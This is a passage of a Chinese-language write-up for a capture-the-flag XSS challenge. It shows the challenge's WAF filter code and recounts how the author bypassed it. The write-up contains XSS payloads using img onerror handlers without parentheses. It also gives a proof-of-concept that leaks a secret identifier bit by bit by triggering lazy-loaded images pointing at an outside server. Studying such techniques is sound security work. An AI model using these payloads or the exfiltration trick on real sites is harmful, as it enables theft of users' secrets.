@@ -1,0 +1,245 @@
+function WAF() {
+    const forbidden_words = ['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:'];
+    const dangerous_operators = ['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']
+
+    function decodeHTMLEntities(str) {
+        var ta = document.createElement('textarea');
+        ta.innerHTML = str;
+        return ta.value;
+    }
+
+    function onlyASCII(str){
+        return str.replace(/[^\x21-\x7e]/g,'');
+    }
+
+    function firstTag(str){
+        return str.search(/<[a-z]+/i)
+    }
+
+    function firstOnHandler(str){
+        return str.search(/on[a-z]{3,}/i)
+    }
+
+    function firstEqual(str){
+        return str.search(/=/);
+    }
+
+    function hasDangerousOperators(str){
+        return dangerous_operators.some(op=>str.includes(op));
+    }
+
+    function hasForbiddenWord(str){
+        return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1);
+    }
+
+    this.isSafe = function(str) {
+        let decoded = onlyASCII(decodeHTMLEntities(str));
+
+        const first_tag = firstTag(decoded);
+        if(first_tag === -1) return true;
+        decoded = decoded.slice(first_tag);
+
+        if(hasForbiddenWord(decoded)) return false;
+
+        const first_on_handler = firstOnHandler(decoded);
+        if(first_on_handler === -1) return true;
+        decoded = decoded.slice(first_on_handler)
+
+        const first_equal = firstEqual(decoded);
+        if(first_equal === -1) return true;
+        decoded = decoded.slice(first_equal+1);
+
+        if(hasDangerousOperators(decoded)) return false;
+        return true;
+    }
+}
+```
+
+這邊收到 index 傳來的資料時會經過一系列驗證，看看送來的資料是不是 safe，做的檢查依序為：
+
+1. 先把送來的資料 decode 而且只允許 ASCII
+2. 找第一個 html tag 並且過濾掉 `['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:']`
+3. 找 onXXX handler 之後出現的第一個 = 號
+4. 不能有以下字元 `['"', "'", '``', '(', ')', '{', '}', '[', ']', '=']`
+5. 以上都成功的話才 safe，才會被 index.html 當作 innerHTML 來解釋
+
+結合以上條件，如果我傳 error=123，畫面就會顯示 123。如果我傳 `<h1>hello</h1>`，畫面就真的會顯示一個 hello 的 heading，但如果我傳 `<script>alert(1)</script>`，畫面就只會用文字顯示出來而不是當作 HTML 來執行，因為 safe 是 false。
+
+以上大概就是題目的基本介紹，在這邊非常推薦大家自己先玩玩看，至少嘗試個一兩個小時卡關卡到爆之後再來看心得，收穫會多很多。
+
+底下就是解題的心路歷程，會直接按照我解題的時間軸來寫。
+
+## 初次嘗試
+
+從題目中不難看出，想要成功 XSS 的話有兩條路可以走：
+
+1. 用各種奇技淫巧繞過限制，直接在頁面上執行 XSS
+2. 自己用 `window.open` 打開這頁面然後 postMessage，偽造訊息並且讓 safe 是 true，這樣就可以插入任意 HTML
+
+一開始我是朝 1 的方向來想，因為 2 的話需要知道 identifier 是什麼，但因為那是隨機的所以不可能，我認為是一條死路。
+
+所以接下來就是要想，要怎麼樣去繞過判斷的限制。
+
+從濾掉的 tag 中可以發現我最愛的 `<img>` 沒有被濾掉，而 onXX 的 event handler 只是限制內容，也沒有一起被濾掉，所以可以用：`<img src=x onerror=123>` 來執行 JS。
+
+但問題來了，儘管可以執行 JS，但不能用的字元太多了，`()` 不能用所以不能呼叫函式，想用反引號 ` 來呼叫也不行，那要怎麼樣執行 alert？我在這邊卡了很久，最後去 google：「js call function without parentheses」，找到了這一篇：[js call function without parentheses](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses/35949617)，裡面提到了很多沒有想過的招數。
+
+例如說物件的 valueOf 搭配 +，或者是用 new 的方式搭配 constructor，或最讓我驚豔的一個是 onerror=eval 搭配 throw，這些都是超級帥的技巧，試著不用 `()` 來繞過限制。
+
+但以上這些通通都沒用，因為限制實在是太嚴格了，物件的 `{}` 不能用，new 因為要有空格所以也不能用。不能有空格是因為 `<img onerror=new abc>` 會被解釋為：`<img onerror="new" abc>`，如果想要一起被放入 onerror 就只能自己用 `"` 框起來，但 `"` 是限制的字元不能使用，所以 onerror 裡面不能出現空格。
+
+throw 看起來有點機會，但是作為執行前提的 `onerror=eval` 有個等號，所以也沒辦法使用。
+
+在這時候我就想說，那如果把限制的字元用 HTML entity encode 呢？把 `=` 變成 `&#61;` 來繞過限制。
+
+試了之後發現沒有用，因為早在第一步 `decodeHTMLEntities(str)` 的時候就被還原成字元了，這時候我有兩個想法：
+
+1. 那可以對 decodeHTMLEntities 裡面的 textarea XSS 嗎？
+2. 那可以 double encode 嗎？
+
+第一條路行不通，因為雖然有 `ta.innerHTML = str;`，但這元素從來沒有被放到 DOM 上，所以沒有用。
+
+第二條路也行不通，因為最後 `&#61;` 只會被視作文字來顯示。
+
+嘗試了許久，最後我什麼都試不出來，可以執行成功的程式碼頂多只有：`<img src=x onerror=throw/0/+identifier>`，把 identifier 作為錯誤訊息丟出來，然後就沒了。但這也什麼都做不到。
+
+## 提示的幫助
+
+這個挑戰每獲得 100 個愛心就會放出提示，而因為題目難度太高的關係所以也有加碼提示，我那時看到的有：
+
+1. First hint: find the objective! (4/19 21:57)
+2. Time for another hint! Where to smuggle data? (4/20 00:24)
+3. Time for another tip! One bite after another! (4/20 19:55)
+
+說實在的，以上這幾個提示我都沒有看很懂，比較了解的是第三個，應該是 One "Byte" after another 的意思，回顧到我最前面所提到的 XS-Leaks 那個東西，我這時想說：「靠，該不會我一開始以為死路的路才是正解吧」。
+
+我說的死路就是前面提到的：「從別的地方自己 postMessage 偽造訊息」，但前提是我要知道隨機產生的 identifier 是什麼才能成功。如果說這條路才是正解，那要解開的話流程就應該是：
+
+1. 開一個自己的網頁，用 window.open 打開 xss challenge
+2. 用某種方法得到 identifier
+3. 從這個網頁自己 postMessage 過去，插入任意 HTML
+
+只要第二步成功了就可以整個串起來了。但問題是，我要怎麼知道 identifier 是什麼？既然提示說 one byte after another，那我猜應該是一個字元一個字元洩漏出去，所以可以先從一個字元開始想。
+
+此時我想到這個：`<img src=x onerror=identifier<'1'?is_zero:keep_trying>`，我們可以用三元運算子搭配 `<` 來判斷第一個字是什麼，雖然不能用字串，但 `'1'` 可以用 `<div id=n1>1</div>` + `n1.innerText` 來取代，來避開單雙引號。而三元運算子可以一直巢狀下去，像是這樣：
+
+``` js
+identifier<'1'?is_zero:
+identifier<'2'?is_one:
+identifier<'3'?is_two:
+identifier<'4'?is_three:
+....
+```
+
+所以我們確實可以透過這方法得知 identifier 的第一個字元是什麼，但問題來了，知道之後，我們怎樣把這個資訊傳出去？
+
+我們不能呼叫 function，甚至連賦值也不行，怎樣把資訊傳出去？如果可以用 `=` 的話那就可以 `window.opener.location = xxx+1` 之類的去改變 window.opener 的資訊，或者是：`<img id=a src=x>` 搭配 `a.src=xxxx` 去載入一個新的圖片，這樣我從 server side 就可以知道洩漏的字元是什麼。
+
+但因為沒辦法用等號，所以上面這些都做不到。
+
+這時候我又卡關了，而且卡了非常久，完全想不到該怎麼把資訊傳出去，這時候等到了下一個提示：
+
+1. Here's an extra tip: ++ is also an assignment (4/20 22:17)
+
+我一開始看見這提示時覺得好像有點用，卻又不知道該怎麼用。`++` 也可以改變值沒有錯，可是有什麼用呢？我一開始想說朝 window.opener 的方向去想，有沒有一些屬性是可以操控的，例如說：`window.opener.name++`是可行的嗎？或是有什麼其他屬性可以操控的。
+
+如果我能夠改變某個 window.opener 的屬性，就能把洩漏的資訊透過某種方式傳回去。可是我找了很久還去翻了 spec，發現好像沒這種東西。`window.opener.location` 可以改變，但不能用 `++`，因為 `++` 就像是 `window.opener.location = window.opener.location + 1`，執行的話會拋錯，因為有涉及到讀取：
+
+```
+VM82:1 Uncaught DOMException: Blocked a frame with origin "https://challenge-0421.intigriti.io" from accessing a cross-origin frame.
+```
+
+這時我想起了忘記在哪學到的一個招數，利用圖片的載入。
+
+舉例來說，讓一張圖片不被載入，然後透過 ++ 改變 CSS 或其他屬性讓它載入，這樣我就可以從 server 知道這個資訊。
+
+我試了這個：
+
+``` html
+<img id=n0 src=//server/n0 style="opacity:0;">
+<img src=x onerror=identifier<'1'?n0.style.opacity++:...>
+```
+
+但透明度是 0 還是會載入圖片，所以沒有用。後來再試了幾個屬性，想起了最近有用到的一個：`loading`。
+
+以往如果要 lazy load 圖片的話，比較多是透過套件，早期需要去偵測 scroll，近期則是用 IntersectionObserver 就行了。而再更近一點，現在有不少瀏覽器有支援原生的 lazy loading：`<img src=x loding="lazy">`，如果圖片距離可視區域沒有超過一個 threshold 的話就不會被載入。
+
+因此我們可以這樣做：
+
+``` html
+<div style="height: 9999px"></div>
+<img id=n0 src=//server/n0 loading="lazy">
+<img src=x onerror=identifier<'1'?n0.loading++:...>
+```
+
+先用一個很高的 div 把圖片往下推，推到 threshold 之外，然後在確認第一個字元是 0 的時候，把 n0 的 loading++，++ 之後會是 NaN，然後因為 loading 沒有 NaN 這個值，所以會 fallback 到預設的 auto，就會載入圖片。
+
+假設 `server/n0` 是我自己的 server，那我收到 n0 這個 request，就代表第一個字元是 0。把這個想法擴展，我們確實可以知道第一個字元是什麼，像這樣：
+
+``` html
+<div style="height: 9999px"></div>
+<img id=n0 src=//server/n0 loading="lazy">
+<img id=n1 src=//server/n1 loading="lazy">
+<img id=n2 src=//server/n2 loading="lazy">
+<img src=x onerror=
+identifier<'1'?n0.loading++:
+identifier<'2'?n1.loading++:
+identifier<'3'?n2.loading++:
+...>
+```
+
+有了第一個字元了！那第二個怎麼辦？
+
+沒辦法用 `identifier[1]`，因為不能用括號。我想說有沒有 `str.1` 這種語法，結果也沒有。
+
+在想過各種可能以後，我覺得這條路是死路，不可能在不能使用 `[](){}` 的情況下，拿到第 n 個字元。
+
+## 解開弱化版？
+
+雖然說我覺得不可能拿到第 n 個字元，解題也就此卡住，但我有了一個大膽的想法。
+
+字串我沒有辦法拿到第 n 個字元，但如果是數字呢？我是不是可以透過一系列數學運算拿到？例如說 123，要拿到 2 就是 123/10%10 之類的（不過出來會是小數）。或者是直接利用二進位，`num&1` 就可以知道 num 的最後一個 bit，`num&2` 就可以知道倒數第二個 bit，以此類推，就可以知道每一個 bit 是多少。
+
+可是 identifier 不是數字，那該怎麼辦？想辦法轉成數字！如果 identifier 只包含 0-9a-z，那我們可以在前面加上 `0x` 並搭配 + 轉成數字，最後會像這樣：
+
+``` js
+<body>
+  <div style=height:9999px id=a>0x</div>
+  <img src=https://example.com/x00 id=x00 loading=lazy>
+  <img src=https://example.com/x01 id=x01 loading=lazy>
+  <img src=https://example.com/x10 id=x10 loading=lazy>
+  <img src=https://example.com/x11 id=x11 loading=lazy>
+  <img src=https://example.com/x20 id=x20 loading=lazy>
+  <img src=https://example.com/x21 id=x21 loading=lazy>
+  <img src=x onerror=
+a.innerText+identifier&1?x01.loading++:x00.loading++;
+a.innerText+identifier&2?x11.loading++:x10.loading++;
+a.innerText+identifier&4?x21.loading++:x20.loading++ >
+
+</body>
+<script>
+  var identifier = 'a4' // 164
+  // 10100100
+  
+</script>
+```
+
+這邊要注意的是 operator 的優先順序，有些如果順序不如預期就無法那樣用，例如說：`+'0x'+identifier` 就會先執行 `+0x`，而不是先把後面的字串相加。這邊剛好 & 會先試著轉成數字，所以才能這樣用。
+
+從上面的 POC 可以證明如果我們能把 identifier 轉成數字，我們就可以解開這題。但 identifier 可能會有 f 以上的字元，那他可以轉成數字的機率是多少呢？
+
+``` js
+var count = 0
+for(let i=0; i<100000;i++) {
+  var id = getIdentifier()
+  if (!Number.isNaN(Number('0x' + id))) {
+    count++
+  }
+}
+// 7, 0.007
+console.log(count, (count * 100) / 100000)
+```
+
+不到 0.01%，非常低的機率，平均需要一萬次才能成功。
+
+雖然這個機率無法接受，但至少我知道這個弱化的版本是解得開的。
